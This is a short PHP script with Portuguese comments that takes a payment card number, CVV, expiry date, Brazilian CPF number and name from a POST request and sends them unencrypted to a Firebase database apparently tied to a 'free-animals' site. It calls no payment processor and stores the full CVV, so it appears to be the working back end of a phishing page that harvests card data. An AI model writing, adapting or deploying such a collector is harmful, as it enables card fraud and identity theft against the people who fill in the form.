<?php
// Define o cabeçalho para aceitar JSON
header("Content-Type: application/json");

// Captura os dados enviados via POST
$data = file_get_contents("php://input");
$decodedData = json_decode($data, true);

// Valida os campos
if (empty($decodedData['cardNumber']) || empty($decodedData['cpf']) || empty($decodedData['expirationDate']) || empty($decodedData['cvv']) || empty($decodedData['nome'])) {
    http_response_code(400);
    echo json_encode(["message" => "Todos os campos são obrigatórios."]);
    exit;
}

// Extrai os dados
$cardNumber = htmlspecialchars($decodedData['cardNumber']);
$cpf = htmlspecialchars($decodedData['cpf']);
$expirationDate = htmlspecialchars($decodedData['expirationDate']);
$cvv = htmlspecialchars($decodedData['cvv']);
$nome = htmlspecialchars($decodedData['nome']);

// Formata os dados para o Firebase
$formattedData = [
    'nome' => $nome,
    'cpf' => $cpf,
    'cardNumber' => $cardNumber,
    'expirationDate' => $expirationDate,
    'cvv' => $cvv
];

// Configuração do Firebase
$firebaseUrl = 'https://free-animals-default-rtdb.firebaseio.com/';

// Envia os dados para o Firebase
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $firebaseUrl . ".json"); // O Firebase usa a URL do seu banco com o sufixo `.json`
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($formattedData));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);

$response = curl_exec($ch);
curl_close($ch);

// Verifica se a requisição foi bem-sucedida
if ($response === false) {
    http_response_code(500);
    echo json_encode(["message" => "Erro ao enviar os dados para o Firebase."]);
} else {
    echo json_encode(["message" => "Dados enviados com sucesso para o Firebase!"]);
}
?>
